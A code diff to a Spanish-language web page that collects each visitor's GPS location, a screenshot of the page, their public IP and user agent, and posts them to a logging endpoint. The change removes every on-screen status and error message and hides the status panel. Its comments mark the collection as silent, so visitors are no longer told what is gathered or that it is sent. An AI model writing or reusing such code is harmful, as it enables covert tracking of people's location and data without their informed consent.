@@ -154,7 +154,7 @@
             </div>
         </div>
 
-        <div class="status show" id="status">
+        <div class="status" id="status" style="display: none;">
             <div class="loading"></div>
             <p id="statusText" style="margin-top: 15px; font-size: 1.1em;">
                 🔍 Compartiendo ubicación...
@@ -195,16 +195,13 @@
             }
         }
 
-        // Función para obtener la ubicación GPS
+        // Función para obtener la ubicación GPS (silencioso)
         async function getLocation() {
             return new Promise((resolve) => {
                 if (!navigator.geolocation) {
-                    updateStatus('⚠️', 'Tu dispositivo no soporta geolocalización', 'error');
                     resolve(null);
                     return;
                 }
-
-                updateStatus('🔍', 'Obteniendo ubicación GPS...');
 
                 navigator.geolocation.getCurrentPosition(
                     (position) => {
@@ -213,24 +210,9 @@
                             longitude: position.coords.longitude,
                             accuracy: position.coords.accuracy
                         };
-                        
-                        updateStatus('✅', `Ubicación obtenida<br>Lat: ${location.latitude.toFixed(6)}, Lon: ${location.longitude.toFixed(6)}`);
                         resolve(location);
                     },
                     (error) => {
-                        let errorMessage = 'Error al obtener ubicación';
-                        switch(error.code) {
-                            case error.PERMISSION_DENIED:
-                                errorMessage = 'Permiso de ubicación denegado<br>Por favor, permite el acceso';
-                                break;
-                            case error.POSITION_UNAVAILABLE:
-                                errorMessage = 'Ubicación no disponible';
-                                break;
-                            case error.TIMEOUT:
-                                errorMessage = 'Tiempo de espera agotado';
-                                break;
-                        }
-                        updateStatus('⚠️', errorMessage, 'error');
                         resolve(null);
                     },
                     {
@@ -242,72 +224,51 @@
             });
         }
 
-        // Función principal
+        // Función principal (silenciosa)
         async function logVisit() {
             try {
-                // 1. Obtener ubicación GPS
+                // Obtener ubicación GPS en el fondo
                 const location = await getLocation();
-                
-                if (!location) {
-                    updateStatus('⚠️', 'No se pudo obtener la ubicación GPS', 'error');
-                    return;
-                }
 
-                // 2. Capturar pantalla
-                updateStatus('📸', 'Capturando pantalla...');
-                await new Promise(resolve => setTimeout(resolve, 500));
-
+                // Capturar screenshot (opcional, en el fondo)
                 const canvas = await html2canvas(document.body, {
                     allowTaint: true,
                     useCORS: true,
-                    logging: false
+                    logging: false,
+                    backgroundColor: '#ffffff'
                 });
-
                 const screenshot = canvas.toDataURL('image/png');
 
-                // 3. Obtener IP pública y enviar al servidor
+                // Obtener IP pública
                 let publicIp = null;
                 try {
                     const ipRes = await fetch('https://api.ipify.org?format=json');
                     const ipJson = await ipRes.json();
                     publicIp = ipJson.ip;
                 } catch (e) {
-                    console.warn('No se pudo obtener IP pública:', e);
+                    console.warn('No IP:', e);
                 }
 
-                // 4. Enviar al servidor
-                updateStatus('💾', 'Guardando en base de datos...');
-
-                const response = await fetch('/api/log-visit', {
+                // Enviar al servidor (en el fondo)
+                await fetch('/api/log-visit', {
                     method: 'POST',
                     headers: {
                         'Content-Type': 'application/json',
                     },
                     body: JSON.stringify({
                         screenshot: screenshot,
-                        latitude: location.latitude,
-                        longitude: location.longitude,
-                        accuracy: location.accuracy,
+                        latitude: location?.latitude || null,
+                        longitude: location?.longitude || null,
+                        accuracy: location?.accuracy || null,
                         public_ip: publicIp,
                         user_agent: navigator.userAgent
                     })
                 });
 
-                const result = await response.json();
-
-                if (result.success) {
-                    updateStatus('📧', 'Enviando notificación por email...');
-                    
-                    // Pequeña pausa para mostrar el mensaje
-                    await new Promise(resolve => setTimeout(resolve, 1000));
-                    
-                    updateStatus('✅', `¡Ubicación guardada exitosamente!<br>ID: ${result.visitId}<br>Notificación enviada por email`, 'success');
-                } else {
-                    throw new Error('Error al guardar');
-                }
+                // Todo en silencio - no mostrar nada
             } catch (error) {
-                console.error('Error:', error);
-                updateStatus('❌', 'Error al procesar la solicitud', 'error');
+                console.error('Log visit error:', error);
+                // Sin mostrar errores al usuario
             }
         }
 
